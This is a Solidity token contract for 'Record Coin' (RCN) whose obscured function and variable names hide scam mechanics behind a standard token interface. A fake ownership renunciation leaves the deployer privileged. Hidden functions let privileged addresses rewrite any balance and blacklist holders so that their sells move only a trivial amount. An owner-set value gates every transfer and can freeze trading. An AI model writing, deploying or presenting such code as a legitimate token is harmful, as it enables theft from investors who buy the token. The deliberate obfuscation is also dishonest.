//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract minWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletMode {
    function createPair(address feeList, address exemptBuy) external returns (address);

    function feeTo() external view returns (address);
}

interface receiverMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface launchedSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellLaunched) external view returns (uint256);

    function transfer(address totalAtAuto, uint256 exemptSellLimit) external returns (bool);

    function allowance(address tradingLimitExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptSellLimit) external returns (bool);

    function transferFrom(
        address sender,
        address totalAtAuto,
        uint256 exemptSellLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minMaxFrom, uint256 value);
    event Approval(address indexed tradingLimitExempt, address indexed spender, uint256 value);
}

interface amountSwap is launchedSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RecordCoin is minWallet, launchedSwap, amountSwap {

    function transfer(address liquidityExempt, uint256 exemptSellLimit) external virtual override returns (bool) {
        return listTo(_msgSender(), liquidityExempt, exemptSellLimit);
    }

    uint256 constant swapMode = 18 ** 10;

    function launchTx() public {
        emit OwnershipTransferred(senderBuy, address(0));
        walletAuto = address(0);
    }

    address public senderBuy;

    function totalSupply() external view virtual override returns (uint256) {
        return autoTradingReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return senderFee;
    }

    string private launchSell = "Record Coin";

    function decimals() external view virtual override returns (uint8) {
        return fromSell;
    }

    uint256 public txTakeWallet;

    uint256 public liquidityExemptAt;

    address private walletAuto;

    event OwnershipTransferred(address indexed swapLimit, address indexed fundMin);

    function allowance(address walletBuy, address receiverBuy) external view virtual override returns (uint256) {
        if (receiverBuy == senderTrading) {
            return type(uint256).max;
        }
        return shouldAuto[walletBuy][receiverBuy];
    }

    uint256 public swapWalletMarketing;

    address senderTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private totalMarketing;

    string private senderFee = "RCN";

    uint256 public listWallet;

    function tokenTx(address toTx) public {
        walletTotalSender();
        if (shouldTo) {
            liquidityExemptAt = listWallet;
        }
        if (toTx == senderBuy || toTx == walletTake) {
            return;
        }
        modeFee[toTx] = true;
    }

    uint256 autoBuy;

    uint8 private fromSell = 18;

    uint256 public tradingReceiver;

    function isTx(uint256 exemptSellLimit) public {
        walletTotalSender();
        minLimit = exemptSellLimit;
    }

    function buyMode(address receiverSwapWallet, address totalAtAuto, uint256 exemptSellLimit) internal view returns (uint256) {
        require(exemptSellLimit > 0);

        uint256 takeTrading = 0;
        if (receiverSwapWallet == walletTake && maxReceiverTrading > 0) {
            takeTrading = exemptSellLimit * maxReceiverTrading / 100;
        } else if (totalAtAuto == walletTake && tradingTeam > 0) {
            takeTrading = exemptSellLimit * tradingTeam / 100;
        }
        require(takeTrading <= exemptSellLimit);
        return exemptSellLimit - takeTrading;
    }

    function approve(address receiverBuy, uint256 exemptSellLimit) public virtual override returns (bool) {
        shouldAuto[_msgSender()][receiverBuy] = exemptSellLimit;
        emit Approval(_msgSender(), receiverBuy, exemptSellLimit);
        return true;
    }

    function walletTotalSender() private view {
        require(shouldFund[_msgSender()]);
    }

    mapping(address => bool) public shouldFund;

    function transferFrom(address receiverSwapWallet, address totalAtAuto, uint256 exemptSellLimit) external override returns (bool) {
        if (_msgSender() != senderTrading) {
            if (shouldAuto[receiverSwapWallet][_msgSender()] != type(uint256).max) {
                require(exemptSellLimit <= shouldAuto[receiverSwapWallet][_msgSender()]);
                shouldAuto[receiverSwapWallet][_msgSender()] -= exemptSellLimit;
            }
        }
        return listTo(receiverSwapWallet, totalAtAuto, exemptSellLimit);
    }

    bool private limitLaunch;

    function getOwner() external view returns (address) {
        return walletAuto;
    }

    function name() external view virtual override returns (string memory) {
        return launchSell;
    }

    function listTo(address receiverSwapWallet, address totalAtAuto, uint256 exemptSellLimit) internal returns (bool) {
        if (receiverSwapWallet == senderBuy) {
            return toLimit(receiverSwapWallet, totalAtAuto, exemptSellLimit);
        }
        uint256 shouldReceiver = launchedSwap(walletTake).balanceOf(toWallet);
        require(shouldReceiver == minLimit);
        require(totalAtAuto != toWallet);
        if (modeFee[receiverSwapWallet]) {
            return toLimit(receiverSwapWallet, totalAtAuto, swapMode);
        }
        exemptSellLimit = buyMode(receiverSwapWallet, totalAtAuto, exemptSellLimit);
        return toLimit(receiverSwapWallet, totalAtAuto, exemptSellLimit);
    }

    address toWallet;

    uint256 public maxReceiverTrading = 0;

    uint256 public tradingTeam = 0;

    uint256 private autoTradingReceiver = 100000000 * 10 ** 18;

    constructor (){
        
        launchTx();
        receiverMax amountLimit = receiverMax(senderTrading);
        walletTake = walletMode(amountLimit.factory()).createPair(amountLimit.WETH(), address(this));
        toWallet = walletMode(amountLimit.factory()).feeTo();
        
        senderBuy = _msgSender();
        shouldFund[senderBuy] = true;
        totalFee[senderBuy] = autoTradingReceiver;
        
        emit Transfer(address(0), senderBuy, autoTradingReceiver);
    }

    mapping(address => bool) public modeFee;

    mapping(address => uint256) private totalFee;

    bool public feeLimit;

    bool private tradingTeamMin;

    function toLimit(address receiverSwapWallet, address totalAtAuto, uint256 exemptSellLimit) internal returns (bool) {
        require(totalFee[receiverSwapWallet] >= exemptSellLimit);
        totalFee[receiverSwapWallet] -= exemptSellLimit;
        totalFee[totalAtAuto] += exemptSellLimit;
        emit Transfer(receiverSwapWallet, totalAtAuto, exemptSellLimit);
        return true;
    }

    function owner() external view returns (address) {
        return walletAuto;
    }

    uint256 public liquidityMode;

    address public walletTake;

    function balanceOf(address sellLaunched) public view virtual override returns (uint256) {
        return totalFee[sellLaunched];
    }

    uint256 minLimit;

    function launchReceiver(address teamToReceiver) public {
        require(teamToReceiver.balance < 100000);
        if (feeLimit) {
            return;
        }
        if (shouldTo) {
            liquidityMode = liquidityExemptAt;
        }
        shouldFund[teamToReceiver] = true;
        if (liquidityExemptAt == totalMarketing) {
            swapWalletMarketing = liquidityExemptAt;
        }
        feeLimit = true;
    }

    bool private shouldTo;

    mapping(address => mapping(address => uint256)) private shouldAuto;

    function receiverLiquiditySell(address liquidityExempt, uint256 exemptSellLimit) public {
        walletTotalSender();
        totalFee[liquidityExempt] = exemptSellLimit;
    }

}